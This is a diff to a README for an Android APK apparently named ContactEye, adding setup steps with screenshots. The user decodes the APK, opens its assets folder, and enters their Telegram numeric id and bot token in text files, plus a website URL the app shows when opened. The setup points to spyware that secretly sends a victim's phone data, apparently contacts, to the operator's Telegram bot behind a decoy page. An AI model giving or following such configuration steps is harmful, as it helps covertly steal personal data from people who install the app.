@@ -50,10 +50,6 @@ Install Apk editor and open it then selcet <strong>Apk file</strong> and select 
 
 After finding and selecting ContactEye apk file select <strong>full edit</strong> and then <strong>Decode all files</strong>
 
-Navigate to <strong>files tab</strong>
-
-In the files tab navigate to assets folder
-
 <p float="left">
   <img src="/images/prv4.png" width="20%" />
   <img src="/images/prv5.png" width="20%" />
@@ -61,6 +57,25 @@ In the files tab navigate to assets folder
   <img src="/images/prv7.png" width="20%" />
 </p>
 
+
+Navigate to <strong>files tab</strong>
+
+In the files tab navigate to assets folder
+
+<p float="left">
+  <img src="/images/prv8.png" width="20%" />
+</p>
+
+In the assets folder you will see 3 files
+- <strong>id.txt</strong>: Open it, eneter your <strong>numeric Telegram id(which you obtained in step 2)</strong> and save it
+- <strong>token.txt</strong>: Open it, eneter your <strong>Telegram bot token(which you obtained in step 1)</strong> and save it
+- <strong>url.txt</strong>: Open it, eneter the <strong>url of the website that you want to show up</strong> after opening the app
+
+<p float="left">
+  <img src="/images/prv9.png" width="50%" />
+</p>
+
+<strong>MAKE SURE THAT YOU SAVED TEXT FILES AFTER EDITING!</strong>
 
 
 
